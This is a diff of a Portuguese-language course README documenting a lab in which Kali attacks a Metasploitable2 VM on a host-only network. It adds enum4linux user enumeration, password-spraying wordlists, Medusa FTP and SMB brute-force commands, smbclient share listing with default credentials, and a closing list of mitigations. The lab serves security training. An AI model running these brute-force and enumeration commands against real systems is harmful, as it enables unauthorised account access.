@@ -1,4 +1,6 @@
 # DIO-Santander-Ciberseguranca
+
+
 Simulando Ataques de Força Bruta com Medusa (Kali → Metasploitable2)
 Resumo
 
@@ -8,7 +10,7 @@ Ambiente de teste
 
 Host: VirtualBox (Host-Only)
 
-VM Atacante: Kali Linux — 192.168.56.102
+VM Atacante: Kali Linux — 192.168.56.103
 
 VM alvo: Metasploitable2 — 192.168.56.101
 
@@ -75,6 +77,53 @@ Password: msfadmin
 230 Login successful.
 
 
+
+Como salvar logs (exemplo)
+medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6 2>&1 | tee outputs/medusa_ftp.txt
+script -c "medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6" outputs/medusa_session.txt
+
+ENUMERAÇÃO DE USUARIOS COM ENUM4LINUX
+
+# enum4linux -a 192.168.56.101 | tee enum4_output.txt 
+-a = ativar técnicas de enumeração + ip do alvo + tee "nome do arquivo" para gravar saída do comando num arquivo.
+abrir o comando = $ less enum4_output.txt
+
+Enumeração de senhas e acesso utilizando smbclient:
+Tecnica password spraying = testa vários usuarios para mesma senha;
+
+echo -e "user\nmsfadmin\nservice" > smb_ users.txt = criar wordlist de usuarios
+
+echo -e "nmsfadmin\password\nWelcome123\n123456" > senhas_spray.txt = criar wordlist de senhas
+
+medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50 = "ataque via smb testando 2 usuários ate 50 hosts paralelos"
+
+VERIFICAR SE O ACESSO DESCOBERTO É VALIDO
+
+smbclient -L //192.168.56.101 -U "usuario encontrato"
+
+RESULTADO:
+
+└─# smbclient -L //192.168.56.101 -U msfadmin
+Password for [WORKGROUP\msfadmin]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        tmp             Disk      oh noes!
+        opt             Disk
+        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+        msfadmin        Disk      Home Directories
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            METASPLOITABLE
+
+
 Recomendações e Mitigações (resumo)
 
 Desabilitar FTP se não for necessário; usar SFTP/FTPS.
@@ -86,7 +135,3 @@ Forçar senhas fortes e políticas de expiração.
 Monitorar logs de autenticação e alertar tentativas suspeitas.
 
 Segmentar serviços (SMB/FTP) para redes internas apenas.
-
-Como salvar logs (exemplo)
-medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6 2>&1 | tee outputs/medusa_ftp.txt
-script -c "medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6" outputs/medusa_session.txt
